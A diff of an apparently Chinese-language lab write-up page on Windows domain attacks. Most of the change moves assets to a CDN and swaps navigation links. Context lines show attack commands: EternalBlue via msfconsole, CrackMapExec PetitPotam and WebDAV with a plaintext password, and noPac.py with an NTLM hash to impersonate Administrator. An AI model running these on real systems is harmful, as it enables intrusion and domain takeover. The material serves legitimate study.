@@ -5,10 +5,10 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width,initial-scale=1.0" />
-    <link rel="icon" href='/static/favicon.ico' type="image/x-icon">
+    <link rel="icon" href='https://static.dionysus.zip/static/favicon.ico' type="image/x-icon">
     <title>Spoofing - MoonlitSyntax</title>
 
-    <link rel="stylesheet" href='/static/css/app-VZKXMC7L.css'>
+    <link rel="stylesheet" href='https://static.dionysus.zip/static/css/app-VZKXMC7L.css'>
 
 
     <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -240,7 +240,7 @@
 </span></span></code></pre></div></div><div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">[+] 172.22.11.45        MS17-010        (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)
 </span></span></code></pre></div></div><p>永恒之蓝打这个</p>
 <p>viper挂个代理</p>
-<p><div class="c-img" data-full="/static/z-img/Pasted%20image%2020240418090838.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="/static/z-img/Pasted%20image%2020240418090838.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240418090838.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240418090838.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
 <p>逆天为什么不显示</p>
 <div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">proxychains msfconsole
 </span></span><span class="line"><span class="cl">use exploit/windows/smb/ms17_010_eternalblue
@@ -260,7 +260,7 @@
 <p><strong>CrackMapExec</strong></p>
 <div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">p4 crackmapexec smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -M webdav 
 </span></span><span class="line"><span class="cl">p4 crackmapexec smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -M petitpotam
-</span></span></code></pre></div></div><p><div class="c-img" data-full="/static/z-img/Pasted%20image%2020240418101906.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="/static/z-img/Pasted%20image%2020240418101906.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div>[[Pasted image 20240418101950.png]]</p>
+</span></span></code></pre></div></div><p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240418101906.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240418101906.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div>[[Pasted image 20240418101950.png]]</p>
 <p><a href="https://forum.butian.net/share/1944">奇安信攻防社区-红队域渗透NTLM Relay：强制认证方式总结 (butian.net)</a></p>
 <p>参考了大师傅们的博客，发现这里使用的是<code>无ADCS + PetitPotam + NTLM</code>中继打法，思路大概如下</p>
 <p>1、用petitpotam触发目标访问HTTP服务</p>
@@ -325,22 +325,22 @@
 <p>2、账户请求TGT后，更改账户名字，通过S4U2Self申请TGS 票据</p>
 <p>3、DC在TGS_REP阶段，这个账户不存在，DC用自己的密钥加密TGS 票据，提供一个属于该账号的PAC，此时得到一个高权限的ST</p>
 <div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">p4 python3 noPac.py xiaorang.lab/zhanghui -hashes &#39;:1232126b24cdf8c9bd2f788a9d7c7ed1&#39; -dc-ip 172.22.11.6 --impersonate Administrator -create-child -use-ldap -shell
-</span></span></code></pre></div></div><p><div class="c-img" data-full="/static/z-img/Pasted%20image%2020240418110052.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="/static/z-img/Pasted%20image%2020240418110052.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+</span></span></code></pre></div></div><p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240418110052.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240418110052.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
 <p>拿到域控结束</p>
 </article>
 
         <nav class="c-post__nav">
             
-            <a href="/post/tsclient" class="c-post__nav-card c-post__nav-card--prev">
+            <a href="/post/delegation" class="c-post__nav-card c-post__nav-card--prev">
                 <h3>‹ 上一篇</h3>
-                <p class="c-post__nav-title">Tsclient</p>
+                <p class="c-post__nav-title">Delegation</p>
             </a>
             
 
             
-            <a href="/post/certify" class="c-post__nav-card c-post__nav-card--next">
+            <a href="/post/exchange" class="c-post__nav-card c-post__nav-card--next">
                 <h3>下一篇 ›</h3>
-                <p class="c-post__nav-title">Certify</p>
+                <p class="c-post__nav-title">Exchange</p>
             </a>
             
         </nav>
@@ -368,7 +368,7 @@
     </div>
 </div>
 
-<script src='/static/js/app-IJHRYWUS.js' defer></script>
+<script src='https://static.dionysus.zip/static/js/app-IJHRYWUS.js' defer></script>
 
 
 <script src="https://cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js" defer></script>
